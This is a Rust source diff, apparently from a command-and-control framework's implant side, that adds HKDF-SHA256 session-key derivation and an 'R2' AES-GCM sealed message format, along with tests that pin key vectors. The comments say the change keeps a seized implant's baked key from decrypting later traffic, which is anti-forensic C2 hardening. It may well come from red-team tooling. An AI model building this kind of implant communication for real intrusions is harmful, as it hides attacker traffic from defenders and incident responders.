@@ -1,12 +1,20 @@
 use aes_gcm::aead::{Aead, KeyInit, Payload};
 use aes_gcm::Aes256Gcm;
 use base64::Engine;
+use hkdf::Hkdf;
 use rand::RngCore;
+use sha2::Sha256;
 
 // The sealed-body shapes (the teamserver's AesGcmEnvelope contract,
 // extending/implants.md): base64 of
 // b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16), AES-256-GCM under
 // the per-artifact key with a purpose tag binding each direction.
+//
+// The R2 shape is the session-key arm's body (architecture.md Sec 9, session
+// key agreement over the baked seal): the same layout under the "R2" magic,
+// addressed by the session id and sealed with the HKDF-derived session keys a
+// handshake agreed -- so the baked key a seized artifact surrenders opens
+// neither direction of the traffic that followed the agreement.
 
 pub const ENROLL_AAD: &str = "rod-envelope-v1";
 pub const CONTACT_REQUEST_AAD: &str = "rod-contact-v1";
@@ -46,24 +54,7 @@ pub fn parse_baked_key(baked: &str) -> Option<([u8; 16], [u8; 32])> {
 }
 
 fn seal_body(plaintext: &[u8], key_id: &[u8; 16], key: &[u8; 32], aad: &str) -> Vec<u8> {
-    let mut nonce = [0u8; 12];
-    rand::thread_rng().fill_bytes(&mut nonce);
-    let cipher = Aes256Gcm::new_from_slice(key).expect("32-byte key");
-    let sealed = cipher
-        .encrypt(
-            &nonce.into(),
-            Payload {
-                msg: plaintext,
-                aad: aad.as_bytes(),
-            },
-        )
-        .expect("aes-gcm encrypt");
-    let mut body = Vec::with_capacity(2 + 16 + 12 + sealed.len());
-    body.extend_from_slice(b"R1");
-    body.extend_from_slice(key_id);
-    body.extend_from_slice(&nonce);
-    body.extend_from_slice(&sealed);
-    body
+    seal_layout(plaintext, b"R1", key_id, key, aad)
 }
 
 /// The sealed contact wire shape: the R1 body base64-encoded as text, the
@@ -113,10 +104,121 @@ pub fn try_open_contact_body(
 }
 
 fn try_open_body(body: &[u8], key_id: &[u8; 16], key: &[u8; 32], aad: &str) -> Option<Vec<u8>> {
+    try_open_layout(body, b"R1", key_id, key, aad)
+}
+
+/// The session-key arm's agreed keys, as the handshake's HKDF schedule
+/// derives them: the id the R2 body carries where R1 carries the baked key
+/// id, and the two directional AES keys.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct SessionKeys {
+    pub session_id: [u8; 16],
+    pub request: [u8; 32],
+    pub response: [u8; 32],
+}
+
+/// The HKDF info label binding the session schedule to its purpose -- the
+/// same bytes the teamserver and the Go tree bind, so one schedule serves
+/// every stack.
+const SESSION_INFO_LABEL: &[u8] = b"rod-session-v1";
+
+/// Derives the session's sealing keys from the ephemeral agreement (the
+/// teamserver's SessionSealKeys schedule, architecture.md Sec 9):
+/// HKDF-SHA256 with the ECDH shared secret as input keying material, the
+/// baked key as the salt (the root the session binds to), and the purpose
+/// label, baked key id, and implant id as the info. Eighty bytes out: the
+/// session id, the request key, the response key.
+pub fn derive_session_keys(
+    shared: &[u8],
+    baked_key: &[u8; 32],
+    baked_key_id: &[u8; 16],
+    implant_id: &str,
+) -> SessionKeys {
+    let mut info = Vec::with_capacity(SESSION_INFO_LABEL.len() + 1 + 16 + implant_id.len());
+    info.extend_from_slice(SESSION_INFO_LABEL);
+    info.push(0);
+    info.extend_from_slice(baked_key_id);
+    info.extend_from_slice(implant_id.as_bytes());
+
+    let hk = Hkdf::<Sha256>::new(Some(baked_key), shared);
+    let mut okm = [0u8; 80];
+    hk.expand(&info, &mut okm)
+        .expect("80 bytes is within HKDF-SHA256's output limit");
+    let mut session_id = [0u8; 16];
+    session_id.copy_from_slice(&okm[..16]);
+    let mut request = [0u8; 32];
+    request.copy_from_slice(&okm[16..48]);
+    let mut response = [0u8; 32];
+    response.copy_from_slice(&okm[48..80]);
+    SessionKeys {
+        session_id,
+        request,
+        response,
+    }
+}
+
+/// The session-sealed contact wire shape: the R2 body base64-encoded as
+/// text, the twin of [`seal_contact_body`] under the agreed session keys.
+pub fn seal_session_body(plaintext: &[u8], keys: &SessionKeys, aad: &str) -> Vec<u8> {
+    base64::engine::general_purpose::STANDARD
+        .encode(seal_layout(
+            plaintext,
+            b"R2",
+            &keys.session_id,
+            &keys.request,
+            aad,
+        ))
+        .into_bytes()
+}
+
+/// Opens what [`seal_session_body`] sealed under the response direction's
+/// key: None on any mismatch, the same whole-cycle drop the baked seal keeps.
+pub fn try_open_session_body(body: &[u8], keys: &SessionKeys, aad: &str) -> Option<Vec<u8>> {
+    let text = std::str::from_utf8(body).ok()?;
+    let packed = base64::engine::general_purpose::STANDARD
+        .decode(text.trim())
+        .ok()?;
+    try_open_layout(&packed, b"R2", &keys.session_id, &keys.response, aad)
+}
+
+fn seal_layout(
+    plaintext: &[u8],
+    magic: &[u8; 2],
+    id: &[u8; 16],
+    key: &[u8; 32],
+    aad: &str,
+) -> Vec<u8> {
+    let mut nonce = [0u8; 12];
+    rand::thread_rng().fill_bytes(&mut nonce);
+    let cipher = Aes256Gcm::new_from_slice(key).expect("32-byte key");
+    let sealed = cipher
+        .encrypt(
+            &nonce.into(),
+            Payload {
+                msg: plaintext,
+                aad: aad.as_bytes(),
+            },
+        )
+        .expect("aes-gcm encrypt");
+    let mut body = Vec::with_capacity(2 + 16 + 12 + sealed.len());
+    body.extend_from_slice(magic);
+    body.extend_from_slice(id);
+    body.extend_from_slice(&nonce);
+    body.extend_from_slice(&sealed);
+    body
+}
+
+fn try_open_layout(
+    body: &[u8],
+    magic: &[u8; 2],
+    id: &[u8; 16],
+    key: &[u8; 32],
+    aad: &str,
+) -> Option<Vec<u8>> {
     if body.len() < 2 + 16 + 12 + 16 {
         return None;
     }
-    if &body[..2] != b"R1" || &body[2..18] != key_id {
+    if &body[..2] != magic || body[2..18] != *id {
         return None;
     }
     let nonce = &body[18..30];
@@ -233,5 +335,74 @@ mod tests {
         let first = seal_raw_body(b"same", &key_id, &key, DNS_POLL_AAD);
         let second = seal_raw_body(b"same", &key_id, &key, DNS_POLL_AAD);
         assert_ne!(first, second);
+    }
+
+    #[test]
+    fn session_keys_match_the_pinned_vector() {
+        // The schedule is the cross-stack contract: this vector is computed
+        // independently (RFC 5869 HKDF-SHA256 over the fixed inputs) and the
+        // teamserver and the Go tree assert the same bytes, so a drift in
+        // any one stack's derivation fails its own suite before it reaches
+        // the wire.
+        let shared: Vec<u8> = (1u8..=32).collect();
+        let baked: Vec<u8> = (33u8..=64).collect();
+        // new Guid("00112233-4455-6677-8899-aabbccddeeff").ToByteArray() --
+        // .NET's mixed-endian layout, the bytes the bake carries.
+        let key_id: [u8; 16] = [
+            0x33, 0x22, 0x11, 0x00, 0x55, 0x44, 0x77, 0x66, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd,
+            0xee, 0xff,
+        ];
+        let baked_key: [u8; 32] = baked.try_into().expect("32 bytes");
+        let keys = derive_session_keys(
+            &shared,
+            &baked_key,
+            &key_id,
+            "0123456789abcdef0123456789abcdef",
+        );
+        assert_eq!(hex(&keys.session_id), "496c8c72ce8d921c696e21bbe304ff87");
+        assert_eq!(
+            hex(&keys.request),
+            "ddf6e2449a5e1b9e155e86a433b9b7b465f6276977aefcdb3b286031976aacea"
+        );
+        assert_eq!(
+            hex(&keys.response),
+            "846cbaefb2225216df7de958d5508dd9afc339e90d1c342a8aaa9aead24290a6"
+        );
+    }
+
+    #[test]
+    fn session_bodies_round_trip_and_never_open_under_the_baked_key() {
+        let (key_id, key) = baked_key();
+        let keys = SessionKeys {
+            session_id: [0x77; 16],
+            request: [0x88; 32],
+            response: [0x99; 32],
+        };
+        let body = seal_session_body(b"session traffic", &keys, CONTACT_REQUEST_AAD);
+        assert!(
+            std::str::from_utf8(&body).is_ok(),
+            "the session body is base64 text"
+        );
+        assert_eq!(
+            try_open_session_body(&body, &keys, CONTACT_RESPONSE_AAD),
+            None,
+            "the direction's purpose tag binds"
+        );
+        // The seized-config property: a holder of the baked key (its id and
+        // bytes) cannot open the recorded session body under any purpose
+        // tag, and the session open refuses the baked id and key too.
+        let as_text = String::from_utf8_lossy(&body).into_owned();
+        assert_eq!(
+            try_open_contact_body(as_text.as_bytes(), &key_id, &key, CONTACT_REQUEST_AAD),
+            None
+        );
+        assert_eq!(
+            try_open_contact_body(as_text.as_bytes(), &key_id, &key, CONTACT_RESPONSE_AAD),
+            None
+        );
+    }
+
+    fn hex(bytes: &[u8]) -> String {
+        bytes.iter().map(|b| format!("{b:02x}")).collect()
     }
 }
